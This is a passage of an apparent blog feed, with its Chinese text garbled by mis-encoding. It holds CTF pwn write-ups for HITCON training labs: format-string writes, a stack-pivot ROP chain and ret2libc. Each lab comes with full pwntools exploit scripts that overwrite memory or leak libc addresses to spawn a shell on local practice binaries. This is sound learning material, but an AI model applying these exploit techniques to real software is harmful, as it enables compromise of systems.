data-src="https://i.loli.net/2018/10/26/5bd2bd871ce46.png" class="lazyload"></p><h4 id="exp2ï¼šä¿®æ”¹éšæœºæ•°"><a href="#exp2ï¼šä¿®æ”¹éšæœºæ•°" class="headerlink" title="exp2ï¼šä¿®æ”¹éšæœºæ•°"></a>exp2ï¼šä¿®æ”¹éšæœºæ•°</h4><blockquote><p>ç®€å•äº†è§£fmtsträ¹‹åï¼ŒçŸ¥é“åŸæ¥è¿˜æœ‰è¿™ä¹ˆéªšçš„pwntoolsæ¨¡å—ï¼Œè¿™é‡Œç®€å•å¯¹è¿™ä¸ªexpåšä¸ªåˆ†æç†è§£ã€‚</p></blockquote><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#æ¥è‡ªVeritas501å¤§ä½¬çš„exp</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>cn <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./crack'</span><span class="token punctuation">)</span>p_pwd <span class="token operator">=</span> <span class="token number">0x0804A048</span>fmt_len <span class="token operator">=</span> <span class="token number">10</span>cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>pay <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span>fmt_len<span class="token punctuation">,</span><span class="token punctuation">{</span>p_pwd<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">)</span>cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>pay<span class="token punctuation">)</span>cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>è¿è¡Œæ•ˆæœ:</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/26/5bd2c4a2645c3.png" class="lazyload"></p><h2 id="lab8-craxme"><a href="#lab8-craxme" class="headerlink" title="lab8-craxme"></a>lab8-craxme</h2><blockquote><p>è¿™ä¹Ÿæ˜¯ä¸€é¢˜æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ğŸ˜„ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥é€šè¿‡ç±»ä¼¼ä¸Šé¢é¢˜exp2çš„æ–¹å¼æ¥ä¿®æ”¹å€¼è¾¾åˆ°ç›®çš„ã€‚</p></blockquote><h3 id="æ£€æŸ¥ä¿æŠ¤æªæ–½-1"><a href="#æ£€æŸ¥ä¿æŠ¤æªæ–½-1" class="headerlink" title="æ£€æŸ¥ä¿æŠ¤æªæ–½"></a>æ£€æŸ¥ä¿æŠ¤æªæ–½</h3><blockquote><p><code>checksec craxme</code>:</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/26/5bd2cbf09c0e6.png" class="lazyload"></p><p>å¯ä»¥çœ‹åˆ°å‡ ä¹æ‰€æœ‰ä¿æŠ¤æªæ–½éƒ½æ‰“å¼€ï¼Œæ— æ³•é€šè¿‡æ ˆæº¢å‡ºæˆ–è€…æ ˆæ‰§è¡Œç­‰æ¼æ´è¿›è¡Œæ”»å‡»ã€‚</p></blockquote><h3 id="é€»è¾‘åˆ†æ-1"><a href="#é€»è¾‘åˆ†æ-1" class="headerlink" title="é€»è¾‘åˆ†æ"></a>é€»è¾‘åˆ†æ</h3><blockquote><p>åƒlab7ä¸€æ ·ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨idaé‡Œé¢çœ‹åˆ°æœ‰æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/26/5bd2cc3c37cec.png" class="lazyload"></p><p>æˆ‘ä»¬å¯ä»¥è¿è¡Œä¸€ä¸‹è¯•è¯•</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/26/5bd2cb30efb76.png" class="lazyload"></p><p>å¯ä»¥çœ‹åˆ°åœ¨printfå‡½æ•°æ ˆä¸­ç¬¬ä¸ƒä¸ªä½ç½®æ˜¯æˆ‘ä»¬è¾“å…¥çš„å†…å®¹ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯åˆ©ç”¨pwntoolsçš„fmtstr_payloadæ¥æ”¹å˜magicçš„å€¼ã€‚</p><p>é€šè¿‡idaæ‰¾åˆ°magicçš„åœ°å€ï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/26/5bd2cd771b79f.png" class="lazyload"></p><p>é€šè¿‡Pwntools.ELF:</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/26/5bd2ce6d80f25.png" class="lazyload"></p></blockquote><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>magicAddr <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./craxme"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"magic"</span><span class="token punctuation">]</span>inputs <span class="token operator">=</span> int<span class="token punctuation">(</span>input<span class="token punctuation">(</span><span class="token string">"[+]1.flag\n[+]2.craxflag\ninput:"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> inputs <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>magicAddr<span class="token punctuation">:</span> <span class="token number">0xda</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>magicAddr<span class="token punctuation">:</span> <span class="token number">0xfaceb00c</span><span class="token punctuation">}</span><span class="token punctuation">)</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./craxme"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">" :"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>è¿è¡Œæ•ˆæœï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/26/5bd2cfce6cf83.png" class="lazyload"></p><blockquote><p>ä»Šå¤©çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å°±å­¦åˆ°è¿™å„¿å•¦ï¼Œéš¾å—ğŸ˜­ã€‚</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
            <tag> äºŒè¿›åˆ¶å®‰å…¨ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Pwn-10æœˆ25-Hitcon(ä¸‰)</title>
      <link href="/2018/10/25/Pwn-10%E6%9C%8825-Hitcon-%E4%B8%89/"/>
      <url>/2018/10/25/Pwn-10%E6%9C%8825-Hitcon-%E4%B8%89/</url>
      
        <content type="html"><![CDATA[<p>â€¦â€¦</p><a id="more"></a><h1 id="Pwn-10æœˆ25-Hitcon-ä¸‰"><a href="#Pwn-10æœˆ25-Hitcon-ä¸‰" class="headerlink" title="Pwn-10æœˆ25-Hitcon(ä¸‰)"></a>Pwn-10æœˆ25-Hitcon(ä¸‰)</h1><blockquote><p>ä¸€å¤©ä¸€å¤©æ…¢æ…¢æ¥ï¼ŒğŸ˜­</p></blockquote><h2 id="lab6-migration"><a href="#lab6-migration" class="headerlink" title="lab6-migration"></a>lab6-migration</h2><blockquote><p>è¿™ä¸ªé¢˜ç›®æ¶‰åŠåˆ°æ ˆè¿ç§»(stack-pivot)ï¼Œåœ¨<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/stackoverflow/others/#stack-pivoting" target="_blank" rel="noopener">ctf-wiki</a>ä¸Šé¢æ˜¯æœ‰è¿™ä¸ªä¾‹é¢˜å’Œè§£é‡Šçš„ã€‚</p><blockquote><p>è¯¥æŠ€å·§å°±æ˜¯åŠ«æŒæ ˆæŒ‡é’ˆæŒ‡å‘æ”»å‡»è€…æ‰€èƒ½æ§åˆ¶çš„å†…å­˜å¤„ï¼Œç„¶åå†åœ¨ç›¸åº”çš„ä½ç½®è¿›è¡Œ ROPã€‚ä¸€èˆ¬æ¥è¯´ï¼Œæˆ‘ä»¬å¯èƒ½åœ¨ä»¥ä¸‹æƒ…å†µéœ€è¦ä½¿ç”¨ stack pivoting</p><ul><li>å¯ä»¥æ§åˆ¶çš„æ ˆæº¢å‡ºçš„å­—èŠ‚æ•°è¾ƒå°‘ï¼Œéš¾ä»¥æ„é€ è¾ƒé•¿çš„ ROP é“¾</li><li>å¼€å¯äº† PIE ä¿æŠ¤ï¼Œæ ˆåœ°å€æœªçŸ¥ï¼Œæˆ‘ä»¬å¯ä»¥å°†æ ˆåŠ«æŒåˆ°å·²çŸ¥çš„åŒºåŸŸã€‚</li><li>å…¶å®ƒæ¼æ´éš¾ä»¥åˆ©ç”¨ï¼Œæˆ‘ä»¬éœ€è¦è¿›è¡Œè½¬æ¢ï¼Œæ¯”å¦‚è¯´å°†æ ˆåŠ«æŒåˆ°å †ç©ºé—´ï¼Œä»è€Œåœ¨å †ä¸Šå†™ rop åŠè¿›è¡Œå †æ¼æ´åˆ©ç”¨</li></ul><p>æ­¤å¤–ï¼Œåˆ©ç”¨ stack pivoting æœ‰ä»¥ä¸‹å‡ ä¸ªè¦æ±‚:</p><ul><li>å¯ä»¥æ§åˆ¶ç¨‹åºæ‰§è¡Œæµã€‚</li><li>å¯ä»¥æ§åˆ¶ sp æŒ‡é’ˆã€‚ä¸€èˆ¬æ¥è¯´ï¼Œæ§åˆ¶æ ˆæŒ‡é’ˆä¼šä½¿ç”¨ ROPï¼Œå¸¸è§çš„æ§åˆ¶æ ˆæŒ‡é’ˆçš„ gadgets ä¸€èˆ¬æ˜¯</li></ul><pre class=" language-assembly"><code class="language-assembly">pop rsp/esp</code></pre></blockquote><p>åœ¨è¿™é¢˜ä¸­ï¼Œæº¢å‡ºé•¿åº¦ä¸å¤Ÿå¯¼è‡´æ— æ³•ä¸€æ¬¡æ€§æ„é€ ropchainï¼Œå¹¶ä¸”è¿˜é™åˆ¶äº†mainå‡½æ•°æº¢å‡ºçš„æ¬¡æ•°ã€‚</p></blockquote><h3 id="æ£€æŸ¥ä¿æŠ¤æªæ–½"><a href="#æ£€æŸ¥ä¿æŠ¤æªæ–½" class="headerlink" title="æ£€æŸ¥ä¿æŠ¤æªæ–½"></a>æ£€æŸ¥ä¿æŠ¤æªæ–½</h3><blockquote><p><code>checksec migration</code></p><p><img src="https://i.loli.net/2018/10/25/5bd172b663166.png" alt=""></p><p>å¼€å¯äº†NXã€‚</p></blockquote><h3 id="é€»è¾‘åˆ†æ"><a href="#é€»è¾‘åˆ†æ" class="headerlink" title="é€»è¾‘åˆ†æ"></a>é€»è¾‘åˆ†æ</h3><blockquote><p>ida é‡Œé¢çœ‹ä¸€çœ‹ï¼š</p><p><img src="https://i.loli.net/2018/10/25/5bd1738bc3bfe.png" alt=""></p><p>bufå¤§å°ä¸º0x28 = 40å­—èŠ‚ï¼Œè€Œreadè¯»å–0x40 = 64å­—èŠ‚</p><p>gdbè·‘ä¸€ä¸‹ï¼Œçœ‹çœ‹å…·ä½“æƒ…å†µï¼š</p><p><img src="https://i.loli.net/2018/10/25/5bd17674836d1.png" alt=""></p><p>ä¹Ÿå°±æ˜¯è¯´æœ‰4ä¸ªå­—èŠ‚è¢«è¯»å–åˆ°EBPä¸­ï¼Œå‰©ä¸‹20ä¸ªæº¢å‡ºå­—èŠ‚å¯ä»¥ç”¨æ¥æ„é€ ropchainã€‚</p><p>æœç´¢ä¸€ä¸‹å¯ç”¨çš„gadgetï¼š</p><p><img src="https://i.loli.net/2018/10/25/5bd18186ce41f.png" alt=""></p></blockquote><h3 id="æ„é€ exp"><a href="#æ„é€ exp" class="headerlink" title="æ„é€ exp"></a>æ„é€ exp</h3><p>expï¼š</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token comment" spellcheck="true"># -*- coding:utf-8 -*-S</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./migration'</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./migration"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/lib/i386-linux-gnu/libc.so.6"</span><span class="token punctuation">)</span>system_libc <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span><span class="token keyword">print</span> <span class="token string">"system_libc:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>system_libc<span class="token punctuation">)</span>read_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"read"</span><span class="token punctuation">]</span><span class="token keyword">print</span> <span class="token string">"read_plt:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>read_plt<span class="token punctuation">)</span>puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span><span class="token keyword">print</span> <span class="token string">"puts_got:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span>puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span><span class="token keyword">print</span> <span class="token string">"puts_plt:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span>puts_libc <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span><span class="token keyword">print</span> <span class="token string">"puts_libc:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>puts_libc<span class="token punctuation">)</span>binsh_libc<span class="token operator">=</span> libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"binsh_libc:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>binsh_libc<span class="token punctuation">)</span>leave_ret <span class="token operator">=</span> <span class="token number">0x08048418</span>p3ret <span class="token operator">=</span> <span class="token number">0x08048569</span> <span class="token comment" spellcheck="true">#pop esi ; pop edi ; pop ebp ; ret</span>p1ret <span class="token operator">=</span> <span class="token number">0x0804836d</span> <span class="token comment" spellcheck="true">#pop_ebp_ret</span>buf1 <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x500</span>buf2 <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x400</span>payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">40</span><span class="token comment" spellcheck="true"># buf1 ä¸ºebpï¼Œeip ==> read_plt ==> leave_retä¸ºè¿”å›åœ°å€ ==>read(0,buf1,0x100)</span>payload <span class="token operator">+=</span>p32<span class="token punctuation">(</span>buf1<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>read_plt<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>buf1<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#leave;ret ==> mov ebp,esp; pop ebp; ret;</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">" :\n"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#é€šè¿‡ä¹‹å‰çš„leave_retï¼Œå°†buf2ä½œä¸ºebpï¼Œå¾—åˆ°puts_addr,é€šè¿‡libcæ³„éœ²å¾—åˆ°binshï¼Œsystem_addr</span>payload<span class="token operator">=</span>p32<span class="token punctuation">(</span>buf2<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>p1ret<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>read_plt<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>buf2<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>puts_addr <span class="token operator">=</span>u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"puts_addr:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span>offset <span class="token operator">=</span> puts_addr <span class="token operator">-</span> puts_libcsystem_addr <span class="token operator">=</span> system_libc <span class="token operator">+</span> offsetbinsh <span class="token operator">=</span> binsh_libc <span class="token operator">+</span>offset<span class="token triple-quoted-string string">'''payload =p32(buf1)+p32(read_plt)+p32(p3ret)+p32(0)+p32(buf1)+p32(0x100)+p32(system_addr)+p32(0xdeadbeef)+p32(buf1)p.send(payload)sleep(0.1)#p.send("/bin/sh\0")p.interactive()'''</span><span class="token comment" spellcheck="true">#æ‡µé€¼æ ˆ</span>payload <span class="token operator">=</span>p32<span class="token punctuation">(</span>buf1<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"bbbb"</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>expè¿è¡Œæ•ˆæœï¼š<img src="https://i.loli.net/2018/10/25/5bd17a3f8c896.png" alt=""></p><blockquote><p>è¿™é¢˜ä¼ªé€ å‡æ ˆå¸§ï¼Œä»è€Œæ„é€ ropchainï¼Œç®€ç›´å°±æ˜¯ä¸€åœºæ¶ˆåŒ–ç››å®´ï¼Œæˆ‘éœ€è¦å¥½å¥½æ¶ˆåŒ–ä¸€ä¸‹lab6ã€‚</p><p>ä»Šå¤©è¿˜çœ‹äº†ä¸€ä¸‹å®‰æ’ä¸€å‘¨å¹´ç‰¹åˆ«èµ›çš„ä¸€é“pwné¢˜â€“overï¼Œåšä¸€åŠå‘ç°åªèƒ½æ§åˆ¶ebpå’Œeipï¼Ÿï¼Ÿï¼Ÿæ²¡æƒ³åˆ°æ˜¯å®‰æ’æ¯å…­æœˆèµ›çš„ä¸€é“åŸé¢˜ï¼Œåœ¨ctf-wikiçš„èŠ±å¼æ ˆæº¢å‡ºæŠ€å·§é‡Œé¢æœ‰ï¼Œå¹¶ä¸”å’Œlab6ä¸€æ ·ä¹Ÿæ˜¯é€šè¿‡æ§åˆ¶ebpå’Œeipæ¥åšï¼Œä½†æ˜¯é‚£é¢˜å¹¶æ²¡æœ‰å¤šå‡ºæ¥çš„æº¢å‡ºå­—èŠ‚ã€‚</p><p>æ€»çš„æ¥è¯´ï¼Œä¸¤ç§éƒ½å¯ä»¥ç§°ä½œä¼ªé€ å‡æ ˆå¸§ï¼š<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/others/#_6" target="_blank" rel="noopener">CTF-WIKI-èŠ±å¼æ ˆæº¢å‡º</a>ã€‚</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
            <tag> äºŒè¿›åˆ¶å®‰å…¨ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Pwn-10æœˆ24-Hitcon(äºŒ)</title>
      <link href="/2018/10/24/Pwn-10%E6%9C%8824-Hitcon-%E4%BA%8C/"/>
      <url>/2018/10/24/Pwn-10%E6%9C%8824-Hitcon-%E4%BA%8C/</url>
      
        <content type="html"><![CDATA[<p>â€¦â€¦</p><a id="more"></a><h1 id="Pwn-10æœˆ24-hitcon-äºŒ"><a href="#Pwn-10æœˆ24-hitcon-äºŒ" class="headerlink" title="Pwn-10æœˆ24-hitcon(äºŒ)"></a>Pwn-10æœˆ24-hitcon(äºŒ)</h1><blockquote><p>ç»§ç»­hitconçš„è§£é¢˜ä¹‹è·¯ã€‚</p></blockquote><h2 id="lab4-ret2lib"><a href="#lab4-ret2lib" class="headerlink" title="lab4 - ret2lib"></a>lab4 - ret2lib</h2><blockquote><p>æ‹¿åˆ°é¢˜ç›®çœ‹é¢˜ç›®åï¼Œå’Œlab3çš„ret2scå·®ä¸å¤šï¼Œè¿™ä¸ªåº”è¯¥æ˜¯return to libcï¼Œä¹Ÿæ˜¯ä¸€ç§æ”»å‡»æ‰‹æ³•ã€‚æ³„éœ²libcå¹¶ä¸”leakå‡ºlibcåŸºåœ°å€ï¼Œä»è€Œgetshellï¼ŸğŸ˜„</p></blockquote><h3 id="æ£€æŸ¥ä¿æŠ¤æªæ–½"><a href="#æ£€æŸ¥ä¿æŠ¤æªæ–½" class="headerlink" title="æ£€æŸ¥ä¿æŠ¤æªæ–½"></a>æ£€æŸ¥ä¿æŠ¤æªæ–½</h3><blockquote><p><code>checksec ret2lib</code>:</p><p><img src="https://i.loli.net/2018/10/24/5bcffda0c6f43.png" alt=""></p></blockquote><h3 id="é€»è¾‘åˆ†æ"><a href="#é€»è¾‘åˆ†æ" class="headerlink" title="é€»è¾‘åˆ†æ"></a>é€»è¾‘åˆ†æ</h3><blockquote><p>ç®€å•è·‘ä¸€ä¸‹ï¼š</p><p><img src="https://i.loli.net/2018/10/24/5bd0000628c22.png" alt=""></p><p>ç¨‹åºè®©æˆ‘ä»¬è¾“å…¥ä¸€ä¸ªåœ°å€ï¼Œä»¥æ•´å‹çš„å½¢å¼è¾“å…¥ï¼Œç„¶åå®ƒä¼šè¿”å›è¿™ä¸ªåœ°å€å­˜æœ‰çš„å†…å®¹ç»™æˆ‘ä»¬ï¼Œç„¶åè®©æˆ‘ä»¬<code>leave some message</code>ï¼Œå¹¶ä¸”æ‰“å°å‡ºæ¥ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ä¸ªåŠŸèƒ½ä»GOTè¡¨ä¸­å°†ä¸€äº›å‡½æ•°çš„çœŸå®åœ°å€æ‰“å°å‡ºæ¥ï¼Œç„¶åé€šè¿‡libcæ–‡ä»¶ä¸­å‡½æ•°çš„åç§»é‡è®¡ç®—åŸºåœ°å€ï¼Œä¾‹å¦‚å°†æŸä¸€ä¸ªå‡½æ•°çš„GOTæ¡ç›®çš„åœ°å€ä¼ ç»™writeå‡½æ•°ï¼Œå°±å¯ä»¥æ³„æ¼è¿™ä¸ªå‡½æ•°åœ¨è¿›ç¨‹ç©ºé—´ä¸­çš„çœŸå®åœ°å€ï¼Œ<strong>GOTè¡¨ä¸­æ‰€å­˜çš„putså‡½æ•°çš„åœ°å€ä¾¿æ˜¯åœ¨ret2libè¿›ç¨‹ä¸­çš„å®é™…åœ°å€ã€‚</strong></p><p>IDAé‡Œé¢çœ‹çœ‹ï¼š</p><p><img src="https://i.loli.net/2018/10/24/5bd003fbb31e4.png" alt=""></p><p>é€šè¿‡å‘½ä»¤<code>readelf -V ret2lib</code>å¯ä»¥æŸ¥åˆ°å…¶libcåº“ç‰ˆæœ¬ä¸º<code>libc.so.6</code>ï¼š</p><p><img src="https://i.loli.net/2018/10/24/5bd009e18b194.png" alt=""></p><p>é€šè¿‡pwntoolsçš„elfæ¨¡å—æˆ‘ä»¬å¯ä»¥é“¾æ¥è¯¥libc.so.6åº“ï¼Œç®€å•çœ‹çœ‹é‡Œé¢çš„å‡½æ•°åœ°å€ï¼š</p><p><img src="https://i.loli.net/2018/10/24/5bd00c1190711.png" alt=""></p><p>åŒæ ·é’ˆå¯¹è¿™é¢˜å¯ä»¥ä½¿ç”¨IDA <code>alt + t</code>æ¥æŸ¥æ‰¾GOTè¡¨putsåœ°å€ï¼Œä¹Ÿå¯é€šè¿‡ä¸Šè¿°ELFæ¨¡å—é“¾æ¥ret2libç¨‹åºï¼Œé€šè¿‡<code>elf.got[&#39;puts&#39;]</code>æ¥è·å–GOTè¡¨ä¸­putsæ¡ç›®åœ°å€:</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/24/5bd00d4fb5348.png" class="lazyload"></p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/24/5bd00d70f16de.png" class="lazyload"></p><p>å°†134520860ä½œä¸ºæˆ‘ä»¬éœ€è¦è·å¾—å†…å®¹çš„åœ°å€è¾“å…¥ç¨‹åºï¼š</p><pre class=" language-bash"><code class="language-bash">Do you know <span class="token keyword">return</span> to library ?<span class="token comment" spellcheck="true">###############################</span>What <span class="token keyword">do</span> you want to see <span class="token keyword">in</span> memory?Give me an address <span class="token punctuation">(</span>in dec<span class="token punctuation">)</span> :134520860                                           The content of the address <span class="token keyword">:</span> 0xf7639250</code></pre><p>ç„¶åæˆ‘ä»¬å°±å¾—åˆ°äº†putså‡½æ•°æ¡ç›®åœ¨å­˜åœ¨GOTè¡¨ä¸­çš„å†…å®¹ï¼Œå³<strong>æ­¤æ¬¡</strong>ç¨‹åºè¿è¡Œæ—¶putså‡½æ•°çš„çœŸå®åœ°å€<code>0xf7639250</code>ã€‚</p><p>libcåŸºåœ°å€è®¡ç®—ï¼š<strong>libcbase_addr = puts_addr - libc_puts = 0xf7639250 - 0x67250 = 0xf75d2000</strong></p><p>è¿™é‡Œæˆ‘åªæ˜¯ç®€å•çš„å±•ç¤ºä¸€ä¸‹è®¡ç®—æ–¹æ³•ï¼Œå®é™…ä¸Šåœ¨ç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­libcçš„<strong>åŸºåœ°å€æ˜¯ä¼šå‘ç”Ÿå˜åŒ–çš„</strong>ï¼Œæ‰€ä»¥ä¸èƒ½æå‰è®¡ç®—å¥½åŸºåœ°å€ï¼Œå†å†™expï¼Œè¦åœ¨expé‡Œé¢è®¡ç®—åŸºåœ°å€ï¼Œè¿™æ ·å°±ä¸ä¼šå‡ºé”™ã€‚</p><p>æ—¢ç„¶å·²ç»å¯ä»¥è®¡ç®—å‡ºsystemå‡½æ•°çš„åœ°å€äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±éœ€è¦æ‰¾ä¸€ä¸ªshï¼Œå¯ä»¥å¯»æ‰¾binaryç¨‹åºæœ¬èº«ä¸­çš„å­—ç¬¦ä¸²ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨libcä¸­çš„ï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/24/5bd012dbb4bb5.png" class="lazyload"></p><p>ç„¶åæˆ‘ä»¬å¯ä»¥é€šè¿‡Print_message()å‡½æ•°æº¢å‡ºï¼Œè¦†ç›–EIPçš„å€¼ä½¿å…¶è·³è½¬æ‰§è¡Œsystemå‡½æ•°ï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/24/5bd017ba13b3e.png" class="lazyload"></p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/24/5bd018a67369c.png" 